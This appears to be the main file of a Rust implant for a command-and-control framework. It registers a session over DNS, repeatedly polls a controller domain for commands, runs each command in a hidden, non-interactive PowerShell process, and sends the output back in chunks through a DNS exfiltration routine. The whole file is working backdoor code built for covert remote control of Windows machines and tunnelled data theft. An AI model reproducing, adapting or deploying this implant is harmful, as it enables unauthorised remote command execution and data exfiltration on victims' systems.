use malgo_rust::session::Session;
use malgo_rust::transport::dns::*;
use malgo_rust::transport::Transport;
use std::string::ToString;

use malgo_rust::result::CommandResult;
use powershell_script::PsScriptBuilder;

fn main() {
    let session: Session = Session {
        id: String::from("336df889-c0e9-453a-8675-8bff4176e1b0"),
        project_id: String::from("38b6d3a1-4373-4202-b9d7-b11d399d0ebf"),
    };

    let dns = DNS::new(
        Some("127.0.0.1".to_string()),
        "a.example.com".to_string(),
        session,
    );

    match dns.register_session() {
        Ok(_) => println!("Session registered successfully"),
        Err(e) => println!("Error registering session: {}", e),
    };

    loop {
        match dns.command_info() {
            Ok(resp) => {
                match resp {
                    Some(mut r) => {
                        let mut done = false;
                        let mut offset = 0u64;
                        while !done {
                            match dns.command_details(&mut r, &mut offset) {
                                Ok(last) => {
                                    if last {
                                        done = true
                                    }
                                }
                                Err(_) => {}
                            }
                        }
                        println!("Command: {}", r.command);
                        // TODO: change to custom PsScriptBuilder
                        let ps = PsScriptBuilder::new()
                            .no_profile(true)
                            .non_interactive(true)
                            .hidden(true)
                            .print_commands(false)
                            .build();

                        let result = match ps.run(r.command.as_str()) {
                            Ok(cmd_output) => CommandResult {
                                command_id: r.command_id,
                                result: cmd_output.to_string(),
                            },
                            Err(e) => CommandResult {
                                command_id: r.command_id,
                                result: e.to_string(),
                            },
                        };

                        match dns.set_result_info(&result) {
                            Ok(_) => {}
                            Err(e) => println!("Error setting result info: {}", e),
                        }

                        let mut offset: usize = 0;
                        while offset < result.result.len() {
                            match dns.exfiltrate_chunk(&result, &mut offset) {
                                Ok(_) => {}
                                Err(e) => println!("Error exfiltrating chunk: {}", e),
                            }
                            std::thread::sleep(std::time::Duration::from_millis(1)); // being too fast breaks Windows API
                        }
                    }
                    None => {}
                }
            }
            Err(e) => println!("Error querying for info: {}", e),
        }

        //sleep 5 seconds
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
